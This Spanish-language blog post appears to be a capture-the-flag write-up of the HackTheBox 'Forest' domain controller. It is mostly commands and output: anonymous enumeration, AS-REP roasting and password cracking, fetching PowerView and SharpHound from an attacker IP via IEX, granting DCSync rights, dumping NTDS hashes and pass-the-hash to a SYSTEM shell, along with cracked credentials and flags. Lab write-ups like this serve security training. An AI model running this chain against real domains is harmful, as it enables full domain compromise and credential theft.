---
layout: post
title: "HTB - Forest"
date: 2025-09-01
categories: [HackTheBox, ActiveDirectory]
tags: [htb, writeup, ActiveDirectory]
---

# Enumeración
Identificación de servicios expuestos en el servidor FOREST (htb.local). Se detectan puertos clave de Active Directory (LDAP, Kerberos, SMB, WinRM), confirmando que la máquina es un Domain Controller del dominio htb.local.

```bash
sudo nmap -sV -sC -p- --min-rate 3000 10.10.10.161 -vvv -oA targeted -Pn -n 
PORT      STATE SERVICE      REASON          VERSION                                                                                                                                                                                        
53/tcp    open  domain       syn-ack ttl 127 Simple DNS Plus                                                                                                                                                                                
88/tcp    open  kerberos-sec syn-ack ttl 127 Microsoft Windows Kerberos (server time: 2024-10-29 14:10:57Z)                                                                                                                                 
135/tcp   open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
139/tcp   open  netbios-ssn  syn-ack ttl 127 Microsoft Windows netbios-ssn
389/tcp   open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds syn-ack ttl 127 Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB)
464/tcp   open  kpasswd5?    syn-ack ttl 127
593/tcp   open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped   syn-ack ttl 127
3268/tcp  open  ldap         syn-ack ttl 127 Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped   syn-ack ttl 127
5985/tcp  open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf       syn-ack ttl 127 .NET Message Framing
47001/tcp open  http         syn-ack ttl 127 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
49664/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49665/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49666/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49667/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49671/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49676/tcp open  ncacn_http   syn-ack ttl 127 Microsoft Windows RPC over HTTP 1.0
49677/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49684/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49703/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
49928/tcp open  msrpc        syn-ack ttl 127 Microsoft Windows RPC
Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
|_clock-skew: mean: 2h26m49s, deviation: 4h02m29s, median: 6m48s
| smb-security-mode: 
|   account_used: <blank>
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: required
| smb2-time: 
|   date: 2024-10-29T14:11:56
|_  start_date: 2024-10-29T13:55:07
| smb-os-discovery: 
|   OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3)
|   Computer name: FOREST
|   NetBIOS computer name: FOREST\x00
|   Domain name: htb.local
|   Forest name: htb.local
|   FQDN: FOREST.htb.local
|_  System time: 2024-10-29T07:11:52-07:00
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32753/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 45579/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 44587/udp): CLEAN (Timeout)
|   Check 4 (port 25611/udp): CLEAN (Failed to receive data)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
```

**For which domain is this machine a Domain Controller?**

```bash
crackmapexec smb 10.10.10.161
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
```

**Which of the following services allows for anonymous authentication and can provide us with valuable information about the machine? FTP, LDAP, SMB, WinRM**

Enumeración de ldap
El servicio LDAP permite consultas sin autenticación, revelando la estructura del dominio. Posteriormente, con rpcclient, se extrae un listado de cuentas válidas dentro del dominio.

```bash
ldapsearch -x -H ldap://10.10.10.161 -s base namingcontexts
# extended LDIF
#
# LDAPv3
# base <> (default) with scope baseObject
# filter: (objectclass=*)
# requesting: namingcontexts 
#

#
dn:
namingContexts: DC=htb,DC=local
namingContexts: CN=Configuration,DC=htb,DC=local
namingContexts: CN=Schema,CN=Configuration,DC=htb,DC=local
namingContexts: DC=DomainDnsZones,DC=htb,DC=local
namingContexts: DC=ForestDnsZones,DC=htb,DC=local

# search result
search: 2
result: 0 Success

# numResponses: 2
# numEntries: 1
```

`ldapsearch -x -H ldap://10.10.10.161 -b "DC=htb,DC=local" > ldap-anonymous.out`

Enumeracion de usuarios dentro del dominio

```bash
rpcclient -U "" 10.10.10.161 -N                                                                                                                                                                                                           
rpcclient $> enumdomusers                                                                                                                                                                                                                   
user:[Administrator] rid:[0x1f4]                                                                                                                                                                                                            
user:[Guest] rid:[0x1f5]                                                                                                                                                                                                                    
user:[krbtgt] rid:[0x1f6]                                                                                                                                                                                                                   
user:[DefaultAccount] rid:[0x1f7]                                                                                                                                                                                                           
user:[$331000-VK4ADACQNUCA] rid:[0x463]                                                                                                                                                                                                     
user:[SM_2c8eef0a09b545acb] rid:[0x464]                                                                                                                                                                                                     
user:[SM_ca8c2ed5bdab4dc9b] rid:[0x465]                                                                                                                                                                                                     
user:[SM_75a538d3025e4db9a] rid:[0x466]                                                                                                                                                                                                     
user:[SM_681f53d4942840e18] rid:[0x467]                                                                                                                                                                                                     
user:[SM_1b41c9286325456bb] rid:[0x468]   
user:[SM_9b69f1b9d2cc45549] rid:[0x469]                    
user:[SM_7c96b981967141ebb] rid:[0x46a]
user:[SM_c75ee099d0a64c91b] rid:[0x46b]                                                                               
user:[SM_1ffab36a2f5f479cb] rid:[0x46c]                    
user:[HealthMailboxc3d7722] rid:[0x46e]
user:[HealthMailboxfc9daad] rid:[0x46f]                                                                               
user:[HealthMailboxc0a90c9] rid:[0x470]                    
user:[HealthMailbox670628e] rid:[0x471]
user:[HealthMailbox968e74d] rid:[0x472]       
user:[HealthMailbox6ded678] rid:[0x473]
user:[HealthMailbox83d6781] rid:[0x474]
user:[HealthMailboxfd87238] rid:[0x475]                    
user:[HealthMailboxb01ac64] rid:[0x476]
user:[HealthMailbox7108a4e] rid:[0x477]
user:[HealthMailbox0659cc1] rid:[0x478]                                                                               
user:[sebastien] rid:[0x479]           
user:[lucinda] rid:[0x47a]             
user:[svc-alfresco] rid:[0x47b]        
user:[andy] rid:[0x47e]                
user:[mark] rid:[0x47f]     
user:[santi] rid:[0x480]                            
rpcclient $> exit
```

Posibilidad de realizar ASP-Roast Attack

Expresión regular para filtrar por usuarios

```bash
rpcclient -U "" 10.10.10.161 -N -c 'enumdomusers' | grep -oP '\[.*?\]' | grep -v 0x | tr -d '[]'
Administrator
Guest
krbtgt
DefaultAccount
$331000-VK4ADACQNUCA
SM_2c8eef0a09b545acb
SM_ca8c2ed5bdab4dc9b
SM_75a538d3025e4db9a
SM_681f53d4942840e18
SM_1b41c9286325456bb
SM_9b69f1b9d2cc45549
SM_7c96b981967141ebb
SM_c75ee099d0a64c91b
SM_1ffab36a2f5f479cb
HealthMailboxc3d7722
HealthMailboxfc9daad
HealthMailboxc0a90c9
HealthMailbox670628e
HealthMailbox968e74d
HealthMailbox6ded678
HealthMailbox83d6781
HealthMailboxfd87238
HealthMailboxb01ac64
HealthMailbox7108a4e
HealthMailbox0659cc1
sebastien
lucinda
svc-alfresco
andy
mark
santi
```

Usando GetNPUsers para realizar un ASREP Roast (Kerberos PreAuth) con Authenticatión nula para extraer SVC-ALFRESCO's hash. Tras crackearlo, se obtiene la contraseña en texto plano: s3rvice.

```bash
impacket-GetNPUsers htb.local/ -no-pass -usersfile users.txt
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

/usr/share/doc/python3-impacket/examples/GetNPUsers.py:163: DeprecationWarning: datetime.datetime.utcnow() is deprecated and scheduled for removal in a future version. Use timezone-aware objects to represent datetimes in UTC: datetime.datetime.now(datetime.UTC).
  now = datetime.datetime.utcnow() + datetime.timedelta(days=1)
[-] User Administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)
[-] User HealthMailboxc3d7722 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfc9daad doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxc0a90c9 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox670628e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox968e74d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox6ded678 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox83d6781 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxfd87238 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailboxb01ac64 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox7108a4e doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User HealthMailbox0659cc1 doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User sebastien doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User lucinda doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-alfresco@HTB.LOCAL:7bf120db4c17b16469aa3a5f1130e89f$be7a9fccf4bb7cfb6665b5c143b234f44d156e6ca806ff3574dc3e46b2267989eee56c0adcc0f217564b454306f397aefe044f6ea65e9a377c3a7ea6356b7e80075c2e0dbfc14e45bf462649b7799db7f47953349d785fad5be3425bc08f8e37c1ab5021a3b3a20ecba8997369d4b6f6871d485a034df54687fde8cc0b0ebf9a63cd1c754d821555214deae1492beb075ebe944b3867d590ce82495d77ea95707b4c55d7415c0ffaea856e25113fa78f4fc99dde5cf9f8884caaf4fa5bc8b020ef8ae19e823fd04ccf3a9f40f2809a91d371b58d563f5dbc6bf3f14b031c87c45fcd82461aea
[-] User andy doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User mark doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User santi doesn't have UF_DONT_REQUIRE_PREAUTH set
```

Crack de hash con john

```bash
john -w:$(locate rockyou.txt | tail -n1) hash
Created directory: /home/zprytka/.john
Using default input encoding: UTF-8
Loaded 1 password hash (krb5asrep, Kerberos 5 AS-REP etype 17/18/23 [MD4 HMAC-MD5 RC4 / PBKDF2 HMAC-SHA1 AES 256/256 AVX2 8x])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
s3rvice          ($krb5asrep$23$svc-alfresco@HTB.LOCAL)     
1g 0:00:00:15 DONE (2024-10-29 13:35) 0.06518g/s 266346p/s 266346c/s 266346C/s s4553592..s3r2s1
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Validacion de credenciales en SMB

```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 2>/dev/null
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice
```

Validacion de recursos compartidos

```bash
crackmapexec smb 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' --shares 2>/dev/null
SMB         10.10.10.161    445    FOREST           [*] Windows Server 2016 Standard 14393 x64 (name:FOREST) (domain:htb.local) (signing:True) (SMBv1:True)
SMB         10.10.10.161    445    FOREST           [+] htb.local\svc-alfresco:s3rvice 
SMB         10.10.10.161    445    FOREST           [+] Enumerated shares
SMB         10.10.10.161    445    FOREST           Share           Permissions     Remark
SMB         10.10.10.161    445    FOREST           -----           -----------     ------
SMB         10.10.10.161    445    FOREST           ADMIN$                          Remote Admin
SMB         10.10.10.161    445    FOREST           C$                              Default share
SMB         10.10.10.161    445    FOREST           IPC$                            Remote IPC
SMB         10.10.10.161    445    FOREST           NETLOGON        READ            Logon server share 
SMB         10.10.10.161    445    FOREST           SYSVOL          READ            Logon server share
```

Validacion de acceso por el servicio WinRM

```bash
crackmapexec winrm 10.10.10.161 -u 'svc-alfresco' -p 's3rvice' 2>/dev/null                                                                                                                                                                
SMB         10.10.10.161    5985   FOREST           [*] Windows 10 / Server 2016 Build 14393 (name:FOREST) (domain:htb.local)
HTTP        10.10.10.161    5985   FOREST           [*] http://10.10.10.161:5985/wsman                               
WINRM       10.10.10.161    5985   FOREST           [+] htb.local\svc-alfresco:s3rvice (Pwn3d!)
```

Acceso mediante evil-winrm

```bash
evil-winrm -i 10.10.10.161 -u svc-alfresco -p s3rvice
                                        
Evil-WinRM shell v3.5
                                        
Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc() function is unimplemented on this machine
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> whoami
htb\svc-alfresco
*Evil-WinRM* PS C:\Users\svc-alfresco\Documents> cd ..
*Evil-WinRM* PS C:\Users\svc-alfresco> cd Desktop
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> dir


    Directory: C:\Users\svc-alfresco\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---       10/29/2024   6:55 AM             34 user.txt


type*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop> type user.txt
7053fd9a7affc863382ff6f01940cca3
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop>
```

Se ejecuta SharpHound en la máquina víctima para recolectar información. El análisis con BloodHound revela que svc-alfresco es miembro de Account Operators y tiene control sobre el grupo Exchange Windows Permissions, lo que permite una ruta de escalada a Domain Admin.

https://github.com/puckiestyle/powershell

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:1337/SharpHound.ps1')
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> Invoke-BloodHound -CollectionMethod All
```

In the Queries tab, select the pre-built query “Shortest Path from Owned Principals”.

![imagen de prueba](/assets/img/joplin/9ffe0427fc7b4d39bcca1b078154039d.png)

![imagen de prueba](/assets/img/joplin/eb1cef970f3744e3bf3c9e480891e7da.png)


# Explotación

1.  Crear un usuario en el dominio. Esto es posible porque **svc-alfresco** es miembro del grupo *Account Operators*
2.  Añadir el usuario al grupo *Exchange Windows Permissions* Esto es posible porque **svc-alfresco** tiene permisos **GenericAll** en el grupo \*Exchange Windows Permissions \*.
3.  Otorgue al usuario privilegios DcSync. Esto es posible porque el usuario forma parte del grupo *Exchange Windows Permissions* que tiene permiso **WriteDacl** en el dominio **htb.local** .
4.  Realiza un ataque DcSync y vuelca los hashes de las contraseñas de todos los usuarios del dominio.
5.  Realiza un ataque Pass the Hash para obtener acceso a la cuenta del administrador.

Descargamos PowerView (la version DEV fue la unica que funciona) https://github.com/PowerShellMafia/PowerSploit/tree/dev

`IEX(New-Object Net.WebClient).downloadString('http://10.10.16.5:1337/PowerView.ps1')`

Creacion de un nuevo usuario y posterior validacion

```bash
*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user zprytka password /add /domain
The command completed successfully.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh> net user /domain

User accounts for \\

-------------------------------------------------------------------------------
$331000-VK4ADACQNUCA     Administrator            andy
BleuJex                  DefaultAccount           Guest
HealthMailbox0659cc1     HealthMailbox670628e     HealthMailbox6ded678
HealthMailbox7108a4e     HealthMailbox83d6781     HealthMailbox968e74d
HealthMailboxb01ac64     HealthMailboxc0a90c9     HealthMailboxc3d7722
HealthMailboxfc9daad     HealthMailboxfd87238     krbtgt
lucinda                  mark                     santi
sebastien                SM_1b41c9286325456bb     SM_1ffab36a2f5f479cb
SM_2c8eef0a09b545acb     SM_681f53d4942840e18     SM_75a538d3025e4db9a
SM_7c96b981967141ebb     SM_9b69f1b9d2cc45549     SM_c75ee099d0a64c91b
SM_ca8c2ed5bdab4dc9b     svc-alfresco             zprytka
The command completed with one or more errors.

*Evil-WinRM* PS C:\Users\svc-alfresco\Desktop\bh>
```

Agregamos al usuario zprytka al grupo "Exchange Windows Permission"

`net group "Exchange Windows Permissions" /add zprytka`

Seteamos una credencial al usuario zprytka

`$pass = convertto-securestring 'password' -AsPlainText -Force`

`$cred = New-Object System.Management.Automation.PSCredential('htb\zprytka', $pass)`

`Add-DomainObjectAcl -Credential $cred -TargetIdentity "DC=htb,DC=local" -PrincipalIdentity zprytka -Rights DCSync`

\*\*Estos comandos no funcionaron\*\*

`Add-DomainObjectAcl -Credential $Cred -TargetIdentity htb.local -Rights DCSync -> no anduvo`

`Add-DomainObjectAcl -Credential $cred -TargetIdentity htb.local -PrincipalIdentity zprytka -Rights DCSync -> no anduvo`

secretdump de impacket para realizar un DCSync y dumpear el hash del usuario Administrador

```bash
impacket-secretsdump 'zprytka:password@10.10.10.161'                                                                                                                                                                                      
Impacket v0.12.0.dev1 - Copyright 2023 Fortra                                                                                                                                                                                               
                                                                                                                                                                                                                                            
[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied                                                                                                                                                          
[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)                                                                                                                                                                               
[*] Using the DRSUAPI method to get NTDS.DIT secrets                                                                                                                                                                                        
htb.local\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6:::                                                                                                                                            
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::                                                                                                                                                              
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8:::                                                                                                                                                             
DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
```

psexec de impacket para realizar un pass the hash con el hash del administrador

`impacket-psexec 'administrator'@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6`

```bash
impacket-psexec 'administrator'@10.10.10.161 -hashes aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6
Impacket v0.12.0.dev1 - Copyright 2023 Fortra

[*] Requesting shares on 10.10.10.161.....
[*] Found writable share ADMIN$
[*] Uploading file fmHRcDTH.exe
[*] Opening SVCManager on 10.10.10.161.....
[*] Creating service TDRZ on 10.10.10.161.....
[*] Starting service TDRZ.....
[!] Press help for extra shell commands
Microsoft Windows [Version 10.0.14393]
(c) 2016 Microsoft Corporation. All rights reserved.

C:\Windows\system32> type c:\users\Administrator\Desktop\root.txt
e38b5fc098c0056c8c29b35b680a7f51

C:\Windows\system32>
```